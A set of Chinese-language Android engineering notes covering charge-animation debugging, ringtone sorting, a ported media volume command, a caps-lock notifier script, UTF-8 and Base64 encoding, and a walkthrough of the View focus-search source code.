        //modified end
    }
    usleep(200);
    return NULL;
}

调试方法
./prebuilts/build-tools/linux-x86/bin/ninja -f out/combined-sp7731e_1h10_native.ninja charge 2>&1 | tee charge.log;adb wait-for-device;adb root;adb remount;adb sync vendor;adb shell reboot -p;

如果只修改了图片，只需要把对应的图片 push 到 vendor/etc/res/images 文件夹下关机查看关机充电动画即可

快速模拟测试查看从 0%-100% 的充电效果变化的方法
void *charge_thread(void *cookie) {
    int bat_level = 0;
    for (; !is_exit; ) {
     if(thread_ext_ctrl == CHARGE_THREAD_CTRL){
      thread_count++;
      if(thread_count > 5){
       is_exit = 1;
       thread_count = 0;
      }
     }
        usleep(1000000/ PROGRESSBAR_INDETERMINATE_FPS);
        //modified begin
        //bat_level = battery_capacity();
        bat_level = bat_level > 100 ? 0 : bat_level++;
        //modified end
     if(bat_level < 0){
      thread_st = CHARGE_THREAD_EXIT_ERROR;
     }else{
      thread_st = CHARGE_THREAD_OK;
     }
     pthread_mutex_lock(&gchargeMutex);
     led_control(bat_level);
     status_index = charge_health_check();
     if (screen_on_flag == 1) {
        draw_progress_locked(bat_level);
     }
     pthread_mutex_unlock(&gchargeMutex);
        //Redmine46812 zhangqi modified for power off charge anim 2020/10/27:begin
        usleep(750000);
        //Redmine46812 zhangqi modified for power off charge anim 2020/10/27:end
    }

    usleep(200);
    return NULL;
}

minui简介     https://blog.csdn.net/eliot_shao/article/details/87180451
方法简介        https://blog.csdn.net/weixin_30670965/article/details/95561232
gr_init()  初始化图形设备，分配Pixelflinger库渲染的内存
gr_font_size()  将字体对应的surface长宽赋值给char_width和char_height
int gr_init(void);             /* 初始化图形显示,主要是打开设备、分配内存、初始化一些参数 */  
void gr_exit(void);            /* 注销图形显示,关闭设备并释放内存 */  
int gr_fb_width(void);         /* 获取屏幕的宽度 */  
int gr_fb_height(void);        /* 获取屏幕的高度 */  
gr_pixel *gr_fb_data(void);    /* 获取显示数据缓存的地址 */  
void gr_flip(void);            /* 刷新显示内容 */  
void gr_fb_blank(bool blank);  /* 清屏 */  
void gr_color(unsigned char r, unsigned char g, unsigned char b, unsigned char a);  /* 设置字体颜色 */  
void gr_fill(int x, int y, int w, int h);  /* 填充矩形区域,参数分别代表起始坐标、矩形区域大小 */  
int gr_text(int x, int y, const char *s);  /* 显示字符串 */  
int gr_measure(const char *s);             /* 获取字符串在默认字库中占用的像素长度 */  
void gr_font_size(int *x, int *y);         /* 获取当前字库一个字符所占的长宽 */  
void gr_blit(gr_surface source, int sx, int sy, int w, int h, int dx, int dy);  /* 填充由source指定的图片 */  
unsigned int gr_get_width(gr_surface surface);   /* 获取图片宽度 */  
unsigned int gr_get_height(gr_surface surface);  /* 获取图片高度 */  
int res_create_surface(const char* name, gr_surface* pSurface);  /* 根据图片创建显示资源数据,name为图片在mk文件指定的相对路径 */
void res_free_surface(gr_surface surface);       /* 释放资源数据 */
```

## [SPRD]  [HMD] 修改铃声列表按照指定顺序排序

```text
alps/frameworks/base/media/java/android/media/RingtoneManager.java
diff --git a/alps/frameworks/base/media/java/android/media/RingtoneManager.java b/alps/frameworks/base/media/java/android/media/RingtoneManager.java
index b1afb632335..7caf326c7b6 100644
--- a/alps/frameworks/base/media/java/android/media/RingtoneManager.java
+++ b/alps/frameworks/base/media/java/android/media/RingtoneManager.java
@@ -226,12 +226,13 @@ public class RingtoneManager {
             "android.intent.extra.ringtone.PICKED_URI";
     
     // Make sure the column ordering and then ..._COLUMN_INDEX are in sync
     private static final String[]  INTERNAL_COLUMNS = new String[]  {
         MediaStore.Audio.Media._ID,
         MediaStore.Audio.Media.TITLE,
         MediaStore.Audio.Media.TITLE,
         MediaStore.Audio.Media.TITLE_KEY,
+        MediaStore.Audio.Media.DISPLAY_NAME,
     };
 
     private static final String[]  MEDIA_COLUMNS = new String[]  {
@@ -239,7 +240,9 @@ public class RingtoneManager {
         MediaStore.Audio.Media.TITLE,
         MediaStore.Audio.Media.TITLE,
         MediaStore.Audio.Media.TITLE_KEY,
+        MediaStore.Audio.Media.DISPLAY_NAME,
     };
 
     /**
      * The column index (in the cursor returned by {@link #getCursor()} for the
@@ -596,10 +599,12 @@ public class RingtoneManager {
 
     @UnsupportedAppUsage
     private Cursor getInternalRingtones() {
         final Cursor res = query(
                 MediaStore.Audio.Media.INTERNAL_CONTENT_URI, INTERNAL_COLUMNS,
                 constructBooleanTrueWhereClause(mFilterColumns),
-                null, MediaStore.Audio.Media.DEFAULT_SORT_ORDER);
+                null, MediaStore.Audio.Media.DISPLAY_NAME);
         return new ExternalRingtonesCursorWrapper(res, MediaStore.Audio.Media.INTERNAL_CONTENT_URI);
     }
在查询铃声列表的时候添加一个 DISPLAY_NAME 字段，并按照 DISPLAY_NAME 字段进行排序
并把文件名改成指定的顺序
sagereal/customer_resource/Mantis/audio/alarms/01_Nokia_Alarm_Clock.ogg
sagereal/customer_resource/Mantis/audio/alarms/02_Argon.ogg
sagereal/customer_resource/Mantis/audio/alarms/03_Carbon.ogg
sagereal/customer_resource/Mantis/audio/alarms/04_Helium.ogg
sagereal/customer_resource/Mantis/audio/alarms/05_Krypton.ogg
sagereal/customer_resource/Mantis/audio/alarms/06_Neon.ogg
sagereal/customer_resource/Mantis/audio/alarms/07_Osmium.ogg
sagereal/customer_resource/Mantis/audio/alarms/08_Oxygen.ogg
sagereal/customer_resource/Mantis/audio/alarms/09_Platinum.ogg
sagereal/customer_resource/Mantis/audio/alarms/10_Timer.ogg

从数据库中可以看到 _display_name 就是文件名，在文件名的前面加上序号之后就会按照数字序号进行排序
adb shell "sqlite3 /data/data/com.android.providers.media.module/databases/internal.db \"select _display_name from audio;\""

_display_name
20_Pyxis.ogg
16_Ganymede.ogg
12_Nokia_Stones.ogg
15_Dione.ogg
19_Phobos.ogg
01_Nokia_Tune.ogg
04_Nokia_Bird.ogg
05_Nokia_Bounce.ogg
23_Triton.ogg
21_Sedna.ogg
18_Oberon.ogg
22_Titania.ogg
14_Callisto.ogg
11_Nokia_Spirals.ogg
17_Luna.ogg
06_Nokia_Cadenza.ogg
13_Atria.ogg
02_Nokia_Arrival.ogg
03_Nokia_Barbell.ogg
10_Nokia_Karimba.ogg
09_Nokia_Earring.ogg
08_Nokia_Distance.ogg
07_Nokia_Chirp.ogg
24_Umbriel.ogg
```

## [SPRD] Android R移植获取音量的命令 media

```text
http://192.168.3.78:7080/c/SPRD_R/MOCORDROIDR_Trunk_W20.36.4/+/41433

adb shell media volume --get
[v]  will get volume
[v]  Connecting to AudioService
[v]  volume is 1 in range [0..15] 

diff --git a/alps/build/make/target/product/base_system.mk b/alps/build/make/target/product/base_system.mk
index 4569bceff92..4191c0b163b 100644
--- a/alps/build/make/target/product/base_system.mk
+++ b/alps/build/make/target/product/base_system.mk
@@ -408,4 +408,7 @@ PRODUCT_COPY_FILES += $(call add-to-product-copy-files-if-exists,\
 PRODUCT_COPY_FILES += $(call add-to-product-copy-files-if-exists,\
     frameworks/base/config/dirty-image-objects:system/etc/dirty-image-objects)
 
+PRODUCT_PACKAGES += media media_cmd


然后在 alps/frameworks/base/cmds/media/ 中添加 media 命令的代码(从其他平台上移植过来)
alps/frameworks/base/cmds/media/src/com/android/commands/media/Media.java
alps/frameworks/base/cmds/media/src/com/android/commands/media/VolumeCtrl.java

关键代码如下
public static void run(BaseCommand cmd) throws Exception {
    //----------------------------------------
    // Default parameters
    int stream = AudioManager.STREAM_MUSIC;
    int volIndex = 5;
    int mode = 0;
    int adjDir = AudioManager.ADJUST_RAISE;
    boolean showUi = false;
    boolean doGet = false;

    //----------------------------------------
    // read options
    String option;
    String adjustment = null;
    while ((option = cmd.nextOption()) != null) {
        switch (option) {
            case "--show":
                showUi = true;
                break;
            case "--get":
                doGet = true;
                log(LOG_V, "will get volume");
                break;
            case "--stream":
                stream = Integer.decode(cmd.nextArgRequired()).intValue();
                log(LOG_V, "will control stream=" + stream + " (" + streamName(stream) + ")");
                break;
            case "--set":
                volIndex = Integer.decode(cmd.nextArgRequired()).intValue();
                mode = VOLUME_CONTROL_MODE_SET;
                log(LOG_V, "will set volume to index=" + volIndex);
                break;
            case "--adj":
                mode = VOLUME_CONTROL_MODE_ADJUST;
                adjustment = cmd.nextArgRequired();
                log(LOG_V, "will adjust volume");
                break;
            default:
                throw new IllegalArgumentException("Unknown argument " + option);
        }
    }

    //------------------------------
    // Read options: validation
    if (mode == VOLUME_CONTROL_MODE_ADJUST) {
        if (adjustment == null) {
            cmd.showError("Error: no valid volume adjustment (null)");
            return;
        }
        switch (adjustment) {
            case ADJUST_RAISE: adjDir = AudioManager.ADJUST_RAISE; break;
            case ADJUST_SAME: adjDir = AudioManager.ADJUST_SAME; break;
            case ADJUST_LOWER: adjDir = AudioManager.ADJUST_LOWER; break;
            default:
                cmd.showError("Error: no valid volume adjustment, was " + adjustment
                        + ", expected " + ADJUST_LOWER + "|" + ADJUST_SAME + "|"
                        + ADJUST_RAISE);
                return;
        }
    }

    //----------------------------------------
    // Test initialization
    log(LOG_V, "Connecting to AudioService");
    IAudioService audioService = IAudioService.Stub.asInterface(ServiceManager.checkService(
            Context.AUDIO_SERVICE));
    if (audioService == null) {
        System.err.println(BaseCommand.NO_SYSTEM_ERROR_CODE);
        throw new AndroidException(
                "Can't connect to audio service; is the system running?");
    }

    if (mode == VOLUME_CONTROL_MODE_SET) {
        if ((volIndex > audioService.getStreamMaxVolume(stream))
                || (volIndex < audioService.getStreamMinVolume(stream))) {
            cmd.showError(String.format("Error: invalid volume index %d for stream %d "
                    + "(should be in [%d..%d] )", volIndex, stream,
                    audioService.getStreamMinVolume(stream),
                    audioService.getStreamMaxVolume(stream)));
            return;
        }
    }

    //----------------------------------------
    // Non-interactive test
    final int flag = showUi? AudioManager.FLAG_SHOW_UI : 0;
    final String pack = cmd.getClass().getPackage().getName();
    if (mode == VOLUME_CONTROL_MODE_SET) {
        audioService.setStreamVolume(stream, volIndex, flag, pack/*callingPackage*/);
    } else if (mode == VOLUME_CONTROL_MODE_ADJUST) {
        audioService.adjustStreamVolume(stream, adjDir, flag, pack);
    }
    if (doGet) {
        log(LOG_V, "volume is " + audioService.getStreamVolume(stream) +
                   " in range [" + audioService.getStreamMinVolume(stream) +
                   ".." + audioService.getStreamMaxVolume(stream) + "] ");
    }
}

修改之后模块编译
nn media_cmd;adb push out/target/product/s9863a1h10_go_32b/system/framework/media_cmd.jar system/framework;
```

## ubuntu下大小写切换----java和shell的结合

```text
// java程序获得计算机当前的大小写状态
// 当前为大写则返回true
// 当前为小写则返回false
import java.awt.Toolkit;
import java.awt.event.KeyEvent;

public class Test 
{ 
    public static void main(String[]  args) 
    {
        System.out.println(isUpperLetter());
    }

    private static boolean isUpperLetter() 
    {
        return Toolkit.getDefaultToolkit().getLockingKeyState(
                KeyEvent.VK_CAPS_LOCK);
    }
}

notify.sh
#!/bin/bash
flag="0"
while(true)
do
    result=$(java Test)
    # 由小写变大写
    if [ $result = "true"  ] 
    then 
        if [ $flag = "0"  ] 
        then 
            flag="1"
            notify-send -i ~/chutian.jpg "大写"
        fi
    fi
    # 由大写变小写
    if [ $result = "false" ] 
    then 
        if [ $flag = "1" ] 
        then
            flag="0"
            notify-send -i ~/chutian.jpg "小写"
        fi
    fi
done

开机自启动：在/etc/profile文件中添加    bash 路径名/notify.sh &
```

## Android中String.getBytes()的实现

```text
String.java
public byte[]  getBytes() {
    // Android-changed: Skip StringCoding optimization that needs access to java chars.
    // return StringCoding.encode(value, 0, value.length);
    return getBytes(Charset.defaultCharset());  //以默认字符编码转换
}

public byte[]  getBytes(Charset charset) {
    // BEGIN Android-changed: Skip StringCoding optimization that needs access to java chars.
    // if (charset == null) throw new NullPointerException();
    // return StringCoding.encode(charset, value, 0, value.length);
    if (charset == null) {
        throw new NullPointerException("charset == null");
    }

    final int len = length();
    final String name = charset.name();
    if ("UTF-8".equals(name)) {
        return CharsetUtils.toUtf8Bytes(this, 0, len);
    } else if ("ISO-8859-1".equals(name)) {
        return CharsetUtils.toIsoLatin1Bytes(this, 0, len);
    } else if ("US-ASCII".equals(name)) {
        return CharsetUtils.toAsciiBytes(this, 0, len);
    } else if ("UTF-16BE".equals(name)) {
        return CharsetUtils.toBigEndianUtf16Bytes(this, 0, len);
    }

    ByteBuffer buffer = charset.encode(this);
    byte[]  bytes = new byte[buffer.limit()] ;
    buffer.get(bytes);
    return bytes;
    // END Android-changed: Skip StringCoding optimization that needs access to java chars.
}

以 UTF-8 编码为例
public static native byte[]  toUtf8Bytes(String s, int offset, int length);

代码的具体实现在
alps/art/runtime/native/libcore_util_CharsetUtils.cc

static jbyteArray CharsetUtils_toUtf8Bytes(JNIEnv* env, jclass, jstring java_string, jint offset,
                                           jint length) {
  ScopedObjectAccess soa(env);
  StackHandleScope<1> hs(soa.Self());
  Handle<mirror::String> string(hs.NewHandle(soa.Decode<mirror::String>(java_string)));
  if (string == nullptr) {
    return nullptr;
  }

  NativeUnsafeByteSequence out(env);
  if (!out.resize(length)) {
    return nullptr;
  }

  const int end = offset + length;
  for (int i = offset; i < end; ++i) {
    jint ch = string->CharAt(i);
    if (ch < 0x80) {
      // One byte.
      if (!out.append(ch)) {
        return nullptr;
      }
    } else if (ch < 0x800) {
      // Two bytes.
      if (!out.append((ch >> 6) | 0xc0) || !out.append((ch & 0x3f) | 0x80)) {
        return nullptr;
      }
    } else if (U16_IS_SURROGATE(ch)) {
      // A supplementary character.
      jchar high = static_cast<jchar>(ch);
      jchar low = (i + 1 != end) ? string->CharAt(i + 1) : 0;
      if (!U16_IS_SURROGATE_LEAD(high) || !U16_IS_SURROGATE_TRAIL(low)) {
        if (!out.append('?')) {
          return nullptr;
        }
        continue;
      }
      // Now we know we have a *valid* surrogate pair, we can consume the low surrogate.
      ++i;
      ch = U16_GET_SUPPLEMENTARY(high, low);
      // Four bytes.
      jbyte b1 = (ch >> 18) | 0xf0;
      jbyte b2 = ((ch >> 12) & 0x3f) | 0x80;
      jbyte b3 = ((ch >> 6) & 0x3f) | 0x80;
      jbyte b4 = (ch & 0x3f) | 0x80;
      if (!out.append(b1) || !out.append(b2) || !out.append(b3) || !out.append(b4)) {
        return nullptr;
      }
    } else {
      // Three bytes.
      jbyte b1 = (ch >> 12) | 0xe0;
      jbyte b2 = ((ch >> 6) & 0x3f) | 0x80;
      jbyte b3 = (ch & 0x3f) | 0x80;
      if (!out.append(b1) || !out.append(b2) || !out.append(b3)) {
        return nullptr;
      }
    }
  }
  return out.toByteArray();
}

Base64是一种将二进制流表示为 64 个字符的编码方式。

标准 Base64 编码步骤
下面解释一下Base64的编码步骤：

步骤1：数据输入
在这一步骤，需要将原数据（字符串、图片、音频等任何数据）转换为二进制流。例如前面举的字符串的例子，则需要经过字符编码转换为二进制流。

步骤2：分组转换
从二进制流头部开始，每 6 位为一组，若不足 6 位，则低位补0
每 6 位组成一个新的字节，高位 2 位补 0 ，此时已经获得二进制的Base64编码

步骤3：转换为字符串
将二进制的Base64编码每个字节映射为一个字符，例如0000 0000映射为 A，0011 1111映射为/，此时已经获得Base64编码字符串

步骤4：末尾补位
标准Base64编码字符串的长度为 4 的倍数，否则，在末尾补充=。例如前面的QmFzZTY0IOe8lueggQ==长度就是补充了两个=后，长度为 20。

Base 64能够将任何数据转换为易移植的字符串，避免了传输过程中失真问题。
需要注意的是，Base 64不是一种加密方式，只是一种编码方式。很多时候，我们都将Base64编码作为数据加密后的传输 / 存储格式
```

## Android焦点的一生

```text
故事要从你打开你的Android电视，手拿遥控器按下你神圣的一键开始。
按下一个向下键
在讨论这个操作之前，先说一下Android支持的输入设备，除了我们常见的触摸屏外，还支持键盘、鼠标、游戏手柄、遥控器等。在Linux有一种说法:一切皆文件，同样外接设备对于Linux系统也是一种文件，它们一般被创建在/dev/目录下，而输入设备则创建在/dev/input目录下:
chengfangpeng@ubuntu:/dev/input$ ls
by-id    event0  event10  event12  event14  event16  event2  event4  event6  event8  mice
by-path  event1  event11  event13  event15  event17  event3  event5  event7  event9  mouse0
上面是一台Linux台式机的/dev/input目录。
Android系统是基于Linux系统，所以设备管理都是由Linux内核完成的。下面是一台Android Tv设备的/dev/input目录
marconi:/dev/input # ls
event0 event1 event2 event3 event4 mice mouse0
当设备可用时，Linux内核会在/dev/input目录下创建event0-n或者其他的名称的节点文件，当设备不可用时则会删除该节点。当我们操作一个红外的遥控器，按下向下键时，Tv设备收到红外信号，触发一次硬件中断，Linux内核则会相应的接收到硬件中断，然后将中断加工成原始的输入事件数据写入到对应的设备节点中。用户空间可以通过read()函数将这个事件读取出来。
Android的输入系统就是不停的监听这些输入节点，当发现某个节点有输入时，就将节点的事件读取出来，分发给对应的接受者。
读取/dev/input事件
假如我们想看看/dev/input节点中这些事件长什么样子，可以通过getevent这个工具看到
chengfangpeng@ubuntu:~$ adb root
chengfangpeng@ubuntu:~$ adb shell getevent -lt /dev/input/event0
[    3378.901913]  EV_KEY       KEY_DOWN             DOWN                
[    3378.901913]  EV_SYN       SYN_REPORT           00000000            
[    3379.104075]  EV_KEY       KEY_DOWN             UP                  
[    3379.104075]  EV_SYN       SYN_REPORT           00000000 
可以监听/dev/input/event0这个节点下的输入事件，当我按下遥控器的向下键，监听到的事件。事件类型是KEY_DOWN 值是DOWN和UP,咦!不是还有个SY_REPORT,它是干什么的?EV_SYN是一个特别的事件类型，它用来把同一时刻产生的多个输入数据分割为多个数据包。我们看到了从/dev/input/event0中读出的数据，但是真正的Android是怎么处理的呢，这就涉及到Android的输入系统。
Android输入系统
输入系统的内容比较多，这里不做详细的介绍，后面会专门介绍这一块的逻辑，先挖个坑(不知道什么时候填)，借用一张<<深入理解Android卷3>>的一张图，非常的清楚。
![image-20201015154906543] (/home/chengfangpeng/Nutstore Files/Nutstore/res/image-20201015154906543.png)
我们输入的事件，如同穿天猴一样，蹭蹭的来到了我们当前所在的Window,这里除了输入系统的，又新加了WMS的逻辑，继续挖坑(之后填...),我们默认我们发的事件已经找到了当前的Window,或者说当前的Activity. 如果你对Activity、Window、PhoneWindow、WindowManager、WindowManagerService、ViewRootImpl、DecorView 这些概念也不太熟悉的话，那就继续挖坑（后面会出一篇Activity的一生）。但是在介绍View的焦点机制的时候，上面的一些概念是绕不开的。如果阅读过程中有疑问请查找相应的文章或源码。
ViewRootImpl事件分发
上面的章节提到，遥控器发的事件被传入到了Window中，那到底传到window哪里了，下面是通过点击向下键触发crash的堆栈信息，可以比较清晰的获取事件传递的路径，也验证了上面的结论。
2020-10-15 16:52:59.634 1378-1378/com.xray.focus.sample E/AndroidRuntime: FATAL EXCEPTION: main
    Process: com.xray.focus.sample, PID: 1378
    java.lang.RuntimeException: dispatchKeyEvent crash
        at com.xray.focus.sample.widget.TraceKevEventView.dispatchKeyEvent(TraceKevEventView.java:25)
        at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1912)
        at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1912)
        at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1912)
        at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1912)
        at com.android.internal.policy.DecorView.superDispatchKeyEvent(DecorView.java:436)
        at com.android.internal.policy.PhoneWindow.superDispatchKeyEvent(PhoneWindow.java:1830)
        at android.app.Activity.dispatchKeyEvent(Activity.java:3827)
        at com.android.internal.policy.DecorView.dispatchKeyEvent(DecorView.java:350)
        at android.view.ViewRootImpl$ViewPostImeInputStage.processKeyEvent(ViewRootImpl.java:5337)
        at android.view.ViewRootImpl$ViewPostImeInputStage.onProcess(ViewRootImpl.java:5205)
        at android.view.ViewRootImpl$InputStage.deliver(ViewRootImpl.java:4726)
        at android.view.ViewRootImpl$InputStage.onDeliverToNext(ViewRootImpl.java:4779)
        at android.view.ViewRootImpl$InputStage.forward(ViewRootImpl.java:4745)
        at android.view.ViewRootImpl$AsyncInputStage.forward(ViewRootImpl.java:4885)
        at android.view.ViewRootImpl$InputStage.apply(ViewRootImpl.java:4753)
        at android.view.ViewRootImpl$AsyncInputStage.apply(ViewRootImpl.java:4942)
        at android.view.ViewRootImpl$InputStage.deliver(ViewRootImpl.java:4726)
        at android.view.ViewRootImpl$InputStage.onDeliverToNext(ViewRootImpl.java:4779)
        at android.view.ViewRootImpl$InputStage.forward(ViewRootImpl.java:4745)
        at android.view.ViewRootImpl$InputStage.apply(ViewRootImpl.java:4753)
        at android.view.ViewRootImpl$InputStage.deliver(ViewRootImpl.java:4726)
        at android.view.ViewRootImpl$InputStage.onDeliverToNext(ViewRootImpl.java:4779)
        at android.view.ViewRootImpl$InputStage.forward(ViewRootImpl.java:4745)
        at android.view.ViewRootImpl$AsyncInputStage.forward(ViewRootImpl.java:4918)
        at android.view.ViewRootImpl$ImeInputStage.onFinishedInputEvent(ViewRootImpl.java:5079)
        at android.view.inputmethod.InputMethodManager$PendingEvent.run(InputMethodManager.java:2844)
        at android.view.inputmethod.InputMethodManager.invokeFinishedInputEventCallback(InputMethodManager.java:2427)
        at android.view.inputmethod.InputMethodManager.finishedInputEvent(InputMethodManager.java:2418)
        at android.view.inputmethod.InputMethodManager$ImeInputEventSender.onInputEventFinished(InputMethodManager.java:2821)
        at android.view.InputEventSender.dispatchInputEventFinished(InputEventSender.java:143)
        at android.os.MessageQueue.nativePollOnce(Native Method)
        at android.os.MessageQueue.next(MessageQueue.java:327)
        at android.os.Looper.loop(Looper.java:169)
        at android.app.ActivityThread.main(ActivityThread.java:7021)
        at java.lang.reflect.Method.invoke(Native Method)
        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:486)
        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:872)
从ViewRootImpl开始
ViewRootImpl是整个View树的最上层,在Activity中DecorView是最顶层的View，但是它的mParent是ViewRootImpl，所以严格意义上说ViewRootImpl是整个View树的最上层。遥控器事件会被分发到ViewPostImeInputStage的onProcess方法中。
＃ViewRootImpl.java 
/**
     * Delivers post-ime input events to the view hierarchy.
     */
    final class ViewPostImeInputStage extends InputStage {
        public ViewPostImeInputStage(InputStage next) {
            super(next);
        }

        @Override
        protected int onProcess(QueuedInputEvent q) {
            if (q.mEvent instanceof KeyEvent) {
                //执行事件的分发
                return processKeyEvent(q);
            } else {
                final int source = q.mEvent.getSource();
                if ((source & InputDevice.SOURCE_CLASS_POINTER) != 0) {
                    return processPointerEvent(q);
                } else if ((source & InputDevice.SOURCE_CLASS_TRACKBALL) != 0) {
                    return processTrackballEvent(q);
                } else {
                    return processGenericMotionEvent(q);
                }
            }
        }
        ...
    }
执行事件分发
 private int processKeyEvent(QueuedInputEvent q) {
            final KeyEvent event = (KeyEvent)q.mEvent;

          ...

            // Handle automatic focus changes.
            if (event.getAction() == KeyEvent.ACTION_DOWN) {
                if (groupNavigationDirection != 0) {
                    if (performKeyboardGroupNavigation(groupNavigationDirection)) {
                        return FINISH_HANDLED;
                    }
                } else {
                    if (performFocusNavigation(event)) {//处理焦点的移动
                        return FINISH_HANDLED;
                    }
                }
            }
            return FORWARD;
        }
处理焦点的移动
 private boolean performFocusNavigation(KeyEvent event) {
            int direction = 0;
            switch (event.getKeyCode()) {
                case KeyEvent.KEYCODE_DPAD_LEFT:
                    if (event.hasNoModifiers()) {
                        direction = View.FOCUS_LEFT;
                    }
                    break;
                case KeyEvent.KEYCODE_DPAD_RIGHT:
                    if (event.hasNoModifiers()) {
                        direction = View.FOCUS_RIGHT;
                    }
              ...
                    break;
            }
            if (direction != 0) {
                //这个mView就是DecorView,也是我们Viwe树最底层的View，
                //然后通过findFoucs去查找整个View树中已经获取焦点的那个View.
                View focused = mView.findFocus();
                if (focused != null) {//focused不为空，那么就通过这个focused去查找下一个要获取焦点的View
                    View v = focused.focusSearch(direction);
                    if (v != null && v != focused) {//找到了下一个要获取焦点的View
                        // do the math the get the interesting rect
                        // of previous focused into the coord system of
                        // newly focused view
                        focused.getFocusedRect(mTempRect);
                        if (mView instanceof ViewGroup) {
                            ((ViewGroup) mView).offsetDescendantRectToMyCoords(
                                    focused, mTempRect);
                            ((ViewGroup) mView).offsetRectIntoDescendantCoords(
                                    v, mTempRect);
                        }
                        if (v.requestFocus(direction, mTempRect)) {//让这个将要获取焦点的View真正获取焦点，也有可能获取不到
                            playSoundEffect(SoundEffectConstants
                                    .getContantForFocusDirection(direction));//执行获取到焦点后的音效
                            return true;
                        }
                    }

                   // 没有找到焦点 给view最后一次机会消费按键事件的机会
                    if (mView.dispatchUnhandledMove(focused, direction)) {
                        return true;
                    }
                } else {
                    // 如果当前界面没有焦点走这里，设置一个默认焦点
                    if (mView.restoreDefaultFocus()) {
                        return true;
                    }
                }
            }
            return false;
        }
从View树中查找当前拥有焦点的View
遍历整个View树，找到当前那个正拥有焦点的View , findFocus方法在View和ViewGroup中有不同的实现，这种查找方式和findViewById的实现方式非常的类似。先看View中的实现，其实就是判断mPrivateFlags中是否设置了PFLAG_FOCUSED，无意中说出了焦点的本质，View焦点就是这个PFLAG_FOCUSED属性。
＃View.java
public View findFocus() {
    return (mPrivateFlags & PFLAG_FOCUSED) != 0 ? this : null;
}
ViewGroup中的实现:
#ViewGroup.java
public View findFocus() {
    if (DBG) {
        System.out.println("Find focus in " + this + ": flags="
                + isFocused() + ", child=" + mFocused);
    }

    if (isFocused()) {
        return this;
    }

    if (mFocused != null) {//mFocused这个成员变量代表它自己有焦点或者它包含了有焦点的View
        return mFocused.findFocus();//继续向下查找
    }
    return null;
}
查找下一个将要获取焦点的View
回到上面ViewRootImpl的performFocusNavigation方法，我们find到了当前拥有焦点的View,接下来，通过focused去查找下一个将要获取焦点的View.这个过程是通过focusSearch这个方法实现的，当然它在View和ViewGroup中都有实现。
我们先看View中的实现。逻辑比较简单, 就是如果有父布局，就一直往上找。
#View.java
/**
 * Find the nearest view in the specified direction that can take focus.
 * This does not actually give focus to that view.
 *
 * @param direction One of FOCUS_UP, FOCUS_DOWN, FOCUS_LEFT, and FOCUS_RIGHT
 *
 * @return The nearest focusable in the specified direction, or null if none
 *         can be found.
 */
public View focusSearch(@FocusRealDirection int direction) {
    if (mParent != null) {
        return mParent.focusSearch(this, direction);
    } else {
        return null;
    }
}
我们的布局一般情况都不只一层，而mParent就是一个ViewGroup，所以现在看看ViewGroup中focusSearch的实现。
#ViewGroup.java
/**
 * Find the nearest view in the specified direction that wants to take
 * focus.
 *
 * @param focused The view that currently has focus
 * @param direction One of FOCUS_UP, FOCUS_DOWN, FOCUS_LEFT, and
 *        FOCUS_RIGHT, or 0 for not applicable.
 */
@Override
public View focusSearch(View focused, int direction) {
    if (isRootNamespace()) {
        // root namespace means we should consider ourselves the top of the
        // tree for focus searching; otherwise we could be focus searching
        // into other tabs.  see LocalActivityManager and TabHost for more info.
        return FocusFinder.getInstance().findNextFocus(this, focused, direction);
    } else if (mParent != null) {
        return mParent.focusSearch(focused, direction);
    }
    return null;
}
首先判断当前ViewGroup是不是在View树的最上层，如果不是就继续往上找，如果是，则执行如下逻辑:
return FocusFinder.getInstance().findNextFocus(this, focused, direction);
FocusFinder是查找FoucsView的一个工具类，现在看一下findNextFocus方法
#FocusFinder.java
private View findNextFocus(ViewGroup root, View focused, Rect focusedRect, int direction) {
    View next = null;
    ViewGroup effectiveRoot = getEffectiveRoot(root, focused);
    if (focused != null) {//如果当前的焦点不为空，从用户指定的view中查找，focused设置了nextFoucs***Id属性
        next = findNextUserSpecifiedFocus(effectiveRoot, focused, direction);
    }
    if (next != null) {
        return next;
    }
    ArrayList<View> focusables = mTempList;
    try {
        focusables.clear();
        effectiveRoot.addFocusables(focusables, direction);//将可以获取焦点的备选view放入focusables集合中
        if (!focusables.isEmpty()) {//候选view的集合不为空时，从候选集合中继续查找
            next = findNextFocus(effectiveRoot, focused, focusedRect, direction, focusables);
        }
    } finally {
        focusables.clear();
    }
    return next;
}
首先，如果focused不为空，从用户指定nextFocus***Id来获取下一个获取焦点的View。通常我们可以在xml中指定下一个获取焦点的View的id,如下:
android:nextFocusLeft=""
android:nextFocusRight=""
android:nextFocusDown=""
android:nextFocusUp=""
findNextUserSpecifiedFocus就是从设置的这些id中查找下一个获取焦点的View.
#FocusFinder.java 
private View findNextUserSpecifiedFocus(ViewGroup root, View focused, int direction) {
    // check for user specified next focus
    View userSetNextFocus = focused.findUserSetNextFocus(root, direction);//从当前已经获取焦点的View中查找用户指定的下一个获取焦点的View
    View cycleCheck = userSetNextFocus;
    boolean cycleStep = true; // we want the first toggle to yield false
    while (userSetNextFocus != null) {
        if (userSetNextFocus.isFocusable()
                && userSetNextFocus.getVisibility() == View.VISIBLE
                && (!userSetNextFocus.isInTouchMode()
                        || userSetNextFocus.isFocusableInTouchMode())) {
            return userSetNextFocus;
        }
        userSetNextFocus = userSetNextFocus.findUserSetNextFocus(root, direction);
        if (cycleStep = !cycleStep) {
            cycleCheck = cycleCheck.findUserSetNextFocus(root, direction);
            if (cycleCheck == userSetNextFocus) {
                // found a cycle, user-specified focus forms a loop and none of the views
                // are currently focusable.
                break;
            }
        }
    }
    return null;
}
#View.java
/**
 * If a user manually specified the next view id for a particular direction,
 * use the root to look up the view.
 * @param root The root view of the hierarchy containing this view.
 * @param direction One of FOCUS_UP, FOCUS_DOWN, FOCUS_LEFT, FOCUS_RIGHT, FOCUS_FORWARD,
 * or FOCUS_BACKWARD.
 * @return The user specified next view, or null if there is none.
 */
View findUserSetNextFocus(View root, @FocusDirection int direction) {
    switch (direction) {
        case FOCUS_LEFT:
            if (mNextFocusLeftId == View.NO_ID) return null;
            return findViewInsideOutShouldExist(root, mNextFocusLeftId);
        case FOCUS_RIGHT:
            if (mNextFocusRightId == View.NO_ID) return null;
            return findViewInsideOutShouldExist(root, mNextFocusRightId);
        case FOCUS_UP:
            if (mNextFocusUpId == View.NO_ID) return null;
